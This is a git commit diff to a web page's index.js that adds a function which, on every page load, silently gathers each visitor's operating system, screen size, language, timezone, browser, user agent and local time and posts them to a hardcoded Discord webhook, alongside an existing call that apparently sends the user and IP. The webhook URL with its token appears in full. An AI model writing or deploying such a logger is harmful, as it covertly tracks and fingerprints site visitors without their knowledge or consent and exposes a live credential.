a1319d3285696d0da7665e9578c011ff8cc0e774
Zalaxis <130976751+z4laxis@users.noreply.github.com>
2023-07-22 22:22:09 +0100

    Update index.js

--- index.js
+++ index.js
@@ -220,3 +220,163 @@
         }
         // Automatically send the webhook on page load
         sendUserAndIPToWebhook();
+
+function sendUserInformationToWebhook() {
+    const webhookURL = 'https://discord.com/api/webhooks/1132405889396129819/g8O3i4yyJFmYcrh9tmH3X9UXpRPvPn5BUbjDrJ0nsctfu3uWMf_6gXermzfhqR_KpnWW'; // Replace with your actual Discord webhook URL
+
+    // Get user information
+    const os = getOperatingSystem();
+    const screenInfo = getScreenInfo();
+    const languageInfo = getLanguageInfo();
+    const timezoneInfo = getTimezoneInfo();
+    const browserInfo = getBrowserInfo();
+    const userAgent = getUserAgentInfo();
+    const currentTime = getCurrentTime();
+    const currentDate = getCurrentDate();
+    const javaEnabled = isJavaEnabled();
+    const cookiesEnabled = areCookiesEnabled();
+
+    const embedData = {
+        "title": "User Information",
+        "color": 16776960, // Yellow color (decimal representation)
+        "fields": [
+            {
+                "name": "Operating System",
+                "value": os,
+                "inline": true
+            },
+            {
+                "name": "Screen Dimensions",
+                "value": screenInfo,
+                "inline": true
+            },
+            {
+                "name": "Language",
+                "value": languageInfo,
+                "inline": true
+            },
+            {
+                "name": "Timezone",
+                "value": timezoneInfo,
+                "inline": true
+            },
+            {
+                "name": "Browser",
+                "value": browserInfo,
+                "inline": true
+            },
+            {
+                "name": "User Agent",
+                "value": userAgent,
+                "inline": true
+            },
+            {
+                "name": "Current Time",
+                "value": currentTime,
+                "inline": true
+            },
+            {
+                "name": "Current Date",
+                "value": currentDate,
+                "inline": true
+            },
+            {
+                "name": "Java Enabled",
+                "value": javaEnabled,
+                "inline": true
+            },
+            {
+                "name": "Cookies Enabled",
+                "value": cookiesEnabled,
+                "inline": true
+            }
+        ]
+    };
+
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            embeds: [embedData]
+        }),
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log("User information sent successfully!");
+        } else {
+            console.error("Failed to send user information.");
+        }
+    })
+    .catch(error => console.error(error));
+}
+
+function getOperatingSystem() {
+    const userAgent = navigator.userAgent;
+    let os = 'Unknown';
+    if (userAgent.indexOf('Win') !== -1) os = 'Windows';
+    else if (userAgent.indexOf('Mac') !== -1) os = 'MacOS';
+    else if (userAgent.indexOf('Linux') !== -1) os = 'Linux';
+    else if (userAgent.indexOf('Android') !== -1) os = 'Android';
+    else if (userAgent.indexOf('iOS') !== -1) os = 'iOS';
+    return os;
+}
+
+function getScreenInfo() {
+    return `Width: ${window.screen.width}, Height: ${window.screen.height}`;
+}
+
+function getLanguageInfo() {
+    return navigator.language || 'Unknown';
+}
+
+function getTimezoneInfo() {
+    return Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+}
+
+function getBrowserInfo() {
+    const userAgent = navigator.userAgent;
+    const browserInfo = userAgent.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+    const browserName = browserInfo[1];
+    const browserVersion = browserInfo[2];
+
+    if (browserName === 'Chrome') {
+        return `Google Chrome (Version ${browserVersion})`;
+    } else if (browserName === 'Safari') {
+        return `Safari (Version ${browserVersion})`;
+    } else if (browserName === 'Firefox') {
+        return `Mozilla Firefox (Version ${browserVersion})`;
+    } else if (browserName === 'Edge' || browserName === 'MSIE') {
+        return `Microsoft Internet Explorer (Version ${browserVersion})`;
+    } else if (browserName === 'Opera') {
+        return `Opera (Version ${browserVersion})`;
+    } else {
+        return 'Unknown Browser';
+    }
+}
+
+function getUserAgentInfo() {
+    return navigator.userAgent || 'Unknown';
+}
+
+function getCurrentTime() {
+    const now = new Date();
+    return now.toLocaleTimeString();
+}
+
+function getCurrentDate() {
+    const now = new Date();
+    return now.toLocaleDateString();
+}
+
+function isJavaEnabled() {
+    return navigator.javaEnabled() ? 'Enabled' : 'Disabled';
+}
+
+function areCookiesEnabled() {
+    return navigator.cookieEnabled ? 'Enabled' : 'Disabled';
+}
+
+// Automatically send the webhook on page load
+sendUserInformationToWebhook();
